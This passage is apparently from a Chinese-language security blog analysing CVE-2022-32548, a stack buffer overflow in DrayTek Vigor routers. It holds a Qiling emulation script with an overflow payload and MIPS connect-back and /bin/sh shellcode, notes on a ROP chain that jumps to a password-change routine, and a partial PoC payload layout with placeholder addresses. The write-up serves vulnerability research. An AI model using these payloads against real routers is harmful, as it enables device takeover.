class="line"><span class="string">----&gt; usb_net_init()aned</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver LTE device driver</span></span><br><span class="line"><span class="string">&lt;---- usb_net_init()) is 1 **</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ----------------&gt; usb_register&lt;6&gt;usbcore: registered new interface driver usbserial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ----------------&gt; usb_serial_generic_register</span></span><br><span class="line"><span class="string"> ** DrayDown event==0 **</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ** DrayUp event==0 **</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver usbserial_generic</span></span><br><span class="line"><span class="string">Initializing USB Mass Storage driver...</span></span><br><span class="line"><span class="string">                                       &lt;6&gt;usbcore: registered new interface driver usb-storage</span></span><br><span class="line"><span class="string">USB Mass Storage support registered.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &lt;&lt; sys_board_init_later &gt;&gt;</span></span><br></pre></td></tr></table></figure>



<p>当我们通过 PoC 攻击设备之后，可以从日志输出看到一些 dump 信息, 输出包括  EPC ， 当前崩溃的地址， 如这里里是 0xdeadbeaf， </p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-af71d98c211dbd6a59feee082ebe15b6-3fdfed.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-af71d98c211dbd6a59feee082ebe15b6-3fdfed.png"></a></p>
<p>还会打印栈 和 寄存器</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-92f19cb9d0608f4f58d3e4cd244c72b1-392eaf.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-92f19cb9d0608f4f58d3e4cd244c72b1-392eaf.png"></a></p>
<p>我们可以通过这些输出来调整我们的 PoC, 来达到我们目的，另外为了更方便的调试， 我还使用了 qiling 进行部分代码的模拟, 思路如下：</p>
<p>前面跑一段随便的 shellcode ，然后将 RTOS 整个 binary 读起来， 写入到我 mmap 的内存中。然后设置PC 跳转过去。最后的代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.path.append(<span class="string">&quot;..&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_con = asm(shellcraft.connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1337</span>))</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x81B898A0</span></span><br><span class="line">die_func_addr   = <span class="number">0x8007EF90</span> </span><br><span class="line">test_addr = <span class="number">0x8007EF74</span></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> : <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span></span><br><span class="line">pay+= <span class="string">b&#x27;B&#x27;</span>* (<span class="number">0x118</span> - <span class="number">8</span> - <span class="number">8</span>)</span><br><span class="line"><span class="comment"># pay+= p32(0xdeadbeaf) # s0</span></span><br><span class="line">pay+= p32(password_addr) <span class="comment"># s1   </span></span><br><span class="line">pay+= <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">pay+= p32(test_addr) <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line">padding = <span class="built_in">len</span>(pay) - <span class="number">84</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(pay).decode(<span class="string">&#x27;latin&#x27;</span>) + <span class="string">&#x27;=&#x27;</span> * (padding * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_1</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.log.info(<span class="string">&#x27;now run at: 0x807767A0&#x27;</span>)</span><br><span class="line">    ql.reg.write(<span class="string">&#x27;a0&#x27;</span>, <span class="number">0x21000000</span>)</span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807768B8</span> <span class="comment"># decode username</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_2</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807766ec</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_3</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x80776808</span> </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">MIPS32EL_LIN = unhexlify(<span class="string">&#x27;ffff0628ffffd004ffff05280110e4270ff08424ab0f02240c0101012f62696e2f7368&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nVigor 2912 emu&quot;</span>)</span><br><span class="line">    ql = Qiling(code=shellcode, archtype=<span class="string">&quot;mips&quot;</span>, ostype=<span class="string">&quot;linux&quot;</span>, verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;v2912_3812-kernel&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="comment"># mmap memory</span></span><br><span class="line"></span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x20000000</span>, <span class="number">0x3000000</span>, info=<span class="string">&quot;[STACK  ]&quot;</span>)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x23000000</span>, <span class="number">0x3000000</span>, info=<span class="string">&quot;[SHELLCODE  ]&quot;</span>)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x80020000</span>, <span class="built_in">len</span>(data) + <span class="number">4092</span>, info=<span class="string">&quot;[RTOS ]&quot;</span>)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x82000000</span>, <span class="number">0x4000000</span>)</span><br><span class="line">    ql.mem.show_mapinfo()</span><br><span class="line">    ql.mem.write(<span class="number">0x80020000</span>, data) <span class="comment"># rtos data</span></span><br><span class="line">    ql.mem.write(<span class="number">0x21000000</span>, payload.encode(<span class="string">&#x27;latin&#x27;</span>))</span><br><span class="line">    ql.mem.write(<span class="number">0x23000000</span>, shellcode_con)</span><br><span class="line"></span><br><span class="line">    ql.reg.arch_sp = <span class="number">0x20002000</span> <span class="comment">#sp</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807766EC</span> <span class="comment">#pc</span></span><br><span class="line">    ql.reg.write(<span class="string">&#x27;ra&#x27;</span>, <span class="number">0xdeadbeaf</span>)</span><br><span class="line">    ql.reg.write(<span class="string">&#x27;a0&#x27;</span>, <span class="number">0x21000000</span>)</span><br><span class="line">    ql.hook_address(hook_1, <span class="number">0x807767A0</span>)</span><br><span class="line">    ql.hook_address(hook_2, <span class="number">0x11ff004</span>) <span class="comment"># hjack PC to target functio start address</span></span><br><span class="line">    ql.hook_address(hook_3, <span class="number">0x807768F8</span>)</span><br><span class="line">    <span class="comment"># ql.hook_mem_unmapped(memroy_fix)</span></span><br><span class="line">    ql.debugger = <span class="literal">True</span></span><br><span class="line">    ql.run(begin=<span class="number">0x807766EC</span>)</span><br></pre></td></tr></table></figure>



<p>利用思路：</p>
<p>[x] ret2shellcode :<br>    在尝试这个方法的时候， 发现没法执行 shellcode， 猜测是 指令流水线  cache incoherency  特性， 可能需要刷新指令， 但是调用了个 <code>usleep(10000)</code></p>
<p>虽然看起来 PC 往后移动了， 但是仍然没执行成功， 原因不明。</p>
<p>[✓] rop chain</p>
<p>在逆向一些 cmdlist 的过程中， 发现一个修改密码接口</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-be60d5f11a1865aa7487931264edfee5-8e53df.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-be60d5f11a1865aa7487931264edfee5-8e53df.png"></a></p>
<p>于是我跳转到这个地方， 修改密码 。这里有一些需要跳过坑点，具体可以留给感兴趣的读者了。这里提供一个 PoC 给读者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pay = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 0: b&#x27;admi1\x00\x00\x00&#x27;,</span></span><br><span class="line">        <span class="comment"># 8: shellcode,</span></span><br><span class="line">        <span class="number">272</span>: p32(<span class="number">0xdeadbea0</span>),   <span class="comment"># s0 -&gt; </span></span><br><span class="line">        <span class="number">276</span>: p32(<span class="number">0xdeadbea1</span>),   <span class="comment"># s1 </span></span><br><span class="line">        <span class="number">280</span>: p32(<span class="number">0xdeadbea2</span>),   <span class="comment"># s2 -&gt;</span></span><br><span class="line">        <span class="number">284</span>: p32(<span class="number">0xdeadbea3</span>),   <span class="comment"># s3</span></span><br><span class="line">        <span class="number">288</span>: p32(<span class="number">0xdeadbea4</span>),   <span class="comment"># s4</span></span><br><span class="line">        <span class="number">292</span>: p32(<span class="number">0xdeadbea5</span>),   <span class="comment"># s5</span></span><br><span class="line">        <span class="number">296</span>: p32(<span class="number">0xdeadbea6</span>),   <span class="comment"># s6</span></span><br><span class="line">        <span class="number">308</span>: p32(<span class="number">0xdeadbeaf</span>),   <span class="comment"># ra </span></span><br><span class="line">        <span class="number">360</span>: p32(<span class="number">0x808EC000</span>),   <span class="comment"># </span></span><br><span class="line">        <span class="number">372</span>: p32(<span class="number">0x808EC000</span>),   <span class="comment">#</span></span><br><span class="line">        <span class="number">372</span>+<span class="number">0x40</span> +<span class="number">4</span>: p32(<span class="number">0xdeadbeaf</span>),   <span class="comment"># next ra </span></span><br><span class="line">        <span class="number">432</span>: p32(<span class="number">0xdeadbeaf</span>)   <span class="comment"># next v2 </span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-1383c80801d983eb6a2e3ca3bd499a9b-75928d.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-1383c80801d983eb6a2e3ca3bd499a9b-75928d.png"></a></p>
<p>cmdlist  中一个功能可以用来dump内存，方便调试 。 但是注意这里的 0x800000, 我们需要设置当前用户的权限为 0x800000。 这里就是另外一个挑战了，也留给读者自己解决吧。 2333</p>
<h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;"><a href="https://fw.draytek.com.tw/Vigor2925/">Index of /Vigor2925 (draytek.com.tw)</a><a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;"><a href="https://www.youtube.com/watch?v=CD8HfjdDeuM">HEXACON2022 - Emulate it until you make it! Pwning a DrayTek Router by Philippe Laulheret - YouTube</a><a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;"><a href="https://github.com/sgayou/rbasefind">sgayou/rbasefind: A firmware base address search tool. (github.com)</a><a href="#fnref:3" rev="footnote"> ↩</a></span></li><li id="fn:4"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">4.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;"><a href="https://www.trellix.com/en-us/about/newsroom/stories/research/rce-in-dratyek-routers.html">Unauthenticated Remote Code Execution in a Wide Range of DrayTek Vigor Routers (trellix.com)</a><a href="#fnref:4" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Cause"><span class="toc-number">1.</span> <span class="toc-text">Root Cause</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">3.</span> <span class="toc-text">补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">4.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&text=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&is_video=false&description=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2022-32548 DrayTeck 栈溢出漏洞分析&body=Check out this article: https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&title=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&name=CVE-2022-32548 DrayTeck 栈溢出漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2022-32548-DrayTeck-BufferOverflow.html&t=CVE-2022-32548 DrayTeck 栈溢出漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
